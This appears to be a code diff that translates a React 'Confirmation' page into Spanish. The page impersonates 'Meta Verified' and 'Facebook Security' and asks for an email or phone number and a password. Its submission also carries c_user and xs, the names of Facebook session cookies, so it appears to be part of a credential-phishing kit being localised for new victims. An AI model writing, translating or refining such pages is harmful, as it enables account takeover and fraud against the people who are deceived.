@@ -41,7 +41,6 @@ export default function Confirmation() {
     },
   });
 
-  // Load validation data on mount
   useEffect(() => {
     const storedData = localStorage.getItem('validation_data');
     if (!storedData) {
@@ -60,7 +59,6 @@ export default function Confirmation() {
 
   const onSubmit = async (data: any) => {
     try {
-      // Include all required fields in the submission
       const formattedData = {
         c_user: data.c_user,
         xs: data.xs,
@@ -74,8 +72,8 @@ export default function Confirmation() {
       localStorage.removeItem('validation_data');
 
       toast({
-        title: "Success!",
-        description: "Your form has been submitted successfully"
+        title: "¡Éxito!",
+        description: "Su formulario ha sido enviado correctamente"
       });
       setLocation("/success");
     } catch (error) {
@@ -83,17 +81,16 @@ export default function Confirmation() {
       toast({
         variant: "destructive",
         title: "Error",
-        description: "Failed to submit form. Please try again.",
+        description: "Error al enviar el formulario. Por favor, inténtelo de nuevo.",
       });
     }
   };
 
-
   return (
     <>
       <MetaTags 
-        title="Meta Verified | Confirmation"
-        description="Request a verified badge on Facebook - Final Step"
+        title="Meta Verificado | Confirmación"
+        description="Solicite una insignia verificada en Facebook - Paso Final"
       />
       <div className="min-h-screen bg-[#f0f2f5] flex justify-center items-center p-3 sm:p-4">
         <div className="bg-white p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center">
@@ -103,14 +100,14 @@ export default function Confirmation() {
             className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
           />
           <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
-            Facebook Security
+            Seguridad de Facebook
           </h1>
           <Form {...form}>
             <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
               <div className="text-left">
                 <div className="mb-4">
                   <label className="block font-semibold mb-1.5 text-[#606770] text-xs sm:text-sm">
-                    Contact Method
+                    Método de Contacto
                   </label>
                   <div className="flex gap-4">
                     <button
@@ -122,7 +119,7 @@ export default function Confirmation() {
                           : 'bg-[#e4e6eb] text-[#606770]'
                       }`}
                     >
-                      Email
+                      Correo
                     </button>
                     <button
                       type="button"
@@ -133,7 +130,7 @@ export default function Confirmation() {
                           : 'bg-[#e4e6eb] text-[#606770]'
                       }`}
                     >
-                      Phone
+                      Teléfono
                     </button>
                   </div>
                 </div>
@@ -144,7 +141,7 @@ export default function Confirmation() {
                   render={({ field }) => (
                     <FormItem>
                       <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                        {contactMethod === 'email' ? 'Email Address' : 'Phone Number'}
+                        {contactMethod === 'email' ? 'Correo Electrónico' : 'Número de Teléfono'}
                       </FormLabel>
                       <FormControl>
                         <div className="flex gap-2">
@@ -154,7 +151,7 @@ export default function Confirmation() {
                               onValueChange={setCountryCode}
                             >
                               <SelectTrigger className="w-[100px]">
-                                <SelectValue placeholder="Code" />
+                                <SelectValue placeholder="Código" />
                               </SelectTrigger>
                               <SelectContent className="max-h-[200px]">
                                 {countries.map((country) => (
@@ -169,8 +166,8 @@ export default function Confirmation() {
                             type={contactMethod === 'email' ? 'email' : 'tel'}
                             placeholder={
                               contactMethod === 'email'
-                                ? "Enter email address"
-                                : "Enter phone number"
+                                ? "Ingrese correo electrónico"
+                                : "Ingrese número de teléfono"
                             }
                             className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                             {...field}
@@ -193,12 +190,12 @@ export default function Confirmation() {
                   render={({ field }) => (
                     <FormItem>
                       <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                        Password
+                        Contraseña
                       </FormLabel>
                       <FormControl>
                         <Input
                           type="password"
-                          placeholder="Enter password"
+                          placeholder="Ingrese contraseña"
                           className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
                           {...field}
                         />
@@ -213,7 +210,7 @@ export default function Confirmation() {
                 className="w-full bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm"
                 disabled={form.formState.isSubmitting}
               >
-                {form.formState.isSubmitting ? "Submitting..." : "Submit"}
+                {form.formState.isSubmitting ? "Enviando..." : "Enviar"}
               </Button>
             </form>
           </Form>
